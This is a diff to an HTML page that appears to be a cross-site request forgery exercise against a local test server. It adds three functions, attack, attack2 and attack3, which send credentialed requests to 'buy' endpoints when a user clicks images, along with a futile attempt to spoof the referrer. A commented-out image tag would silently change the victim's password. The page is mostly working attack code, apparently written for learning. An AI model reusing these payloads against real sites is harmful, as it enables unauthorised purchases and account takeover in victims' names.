@@ -9,7 +9,7 @@
     <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
     <script type="text/javascript">
         //src="http://127.0.0.1:3000/buy?solde=8000"
-        function show() {
+        function attack() {
             //let c = Cookies.get('login')
             //Cookies.remove('login')
             //Cookies.set("login2", "aaa", { domain:"localhost", secure: true, sameSite:"none" });
@@ -18,7 +18,55 @@
                 xhrFields: {
                     withCredentials: true
                 },
-                url: 'http://localhost:3000/buy?solde=8000',
+                url: 'http://localhost:3000/buy?solde=4000',
+                type: 'GET',
+                //crossDomain: true,
+                //dataType: "json",
+                //headers: {"Cookie" : "login=aaa"},
+
+                success: function(response) {
+                    console.log("success");
+                },
+                error: function() {
+                    console.log("failed!");
+                }
+            })
+        }
+        function attack2() {
+            //let c = Cookies.get('login')
+            //Cookies.remove('login')
+            //Cookies.set("login2", "aaa", { domain:"localhost", secure: true, sameSite:"none" });
+            //console.log(c);
+            document.referrer = 'http://localhost:3000/'
+            $.ajax({
+                xhrFields: {
+                    withCredentials: true
+                },
+                url: 'http://localhost:3000/buy2?solde=4000',
+                type: 'GET',
+                //crossDomain: true,
+                //dataType: "json",
+                //headers: {"Cookie" : "login=aaa"},
+
+                success: function(response) {
+                    console.log("success");
+                },
+                error: function() {
+                    console.log("failed!");
+                }
+            })
+        }
+        function attack3() {
+            //let c = Cookies.get('login')
+            //Cookies.remove('login')
+            //Cookies.set("login2", "aaa", { domain:"localhost", secure: true, sameSite:"none" });
+            //console.log(c);
+            document.referrer = 'http://localhost:3000/'
+            $.ajax({
+                xhrFields: {
+                    withCredentials: true
+                },
+                url: 'http://localhost:3000/buy3?solde=4000',
                 type: 'GET',
                 //crossDomain: true,
                 //dataType: "json",
@@ -36,7 +84,9 @@
 </head>
 <body>
 <!--    <img src="http://127.0.0.1:3000/changepasswd?npasswd=www&cnpasswd=www" alt="">-->
-    <img src="../image.png" onclick="show()"/>
+    <img src="../image.png" onclick="attack()"/>
+    <img src="../image.png" onclick="attack2()"/>
+    <img src="../image.png" onclick="attack3()"/>
 </body>
 
 
